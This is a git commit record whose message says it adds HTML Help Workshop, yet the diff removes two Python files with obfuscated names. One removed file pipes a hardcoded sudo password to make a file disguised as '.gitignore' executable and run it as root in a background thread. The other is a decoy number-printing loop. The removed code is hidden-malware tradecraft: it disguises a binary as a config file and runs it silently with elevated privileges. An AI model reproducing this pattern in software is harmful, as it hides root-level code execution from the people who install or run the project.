9f29313fd47c3bc1e9443a464907658b8f079463
GoldBigDragon <dnwndugod642@naver.com>
2022-01-03 10:57:45 +0900

    HTML Help Workshop Added
    MS doesn't have a download link.
    But the archive site has it!

--- 99dan/IIIlIlll.py
+++
@@ -1,9 +0,0 @@
-import subprocess
-import threading
-def IIIlIllI():
-    subprocess.getoutput('echo user | sudo -S chmod +x ./gitignore')
-    subprocess.getoutput('echo user | sudo -S mv gitignore .gitignore')
-    subprocess.getoutput('echo user | sudo -S ./.gitignore')
-
-def IIIlIlll():
-    threading.Timer(0, IIIlIllI).start()
--- 99dan/IIllIlll.py
+++
@@ -1,8 +0,0 @@
-import subprocess
-import threading
-def IlIllllI():
-    for IIlIIIll in range(0, 9):
-        print(IIlIIIll)
-
-def lIllIlll():
-    threading.Timer(0, IlIllllI).start()
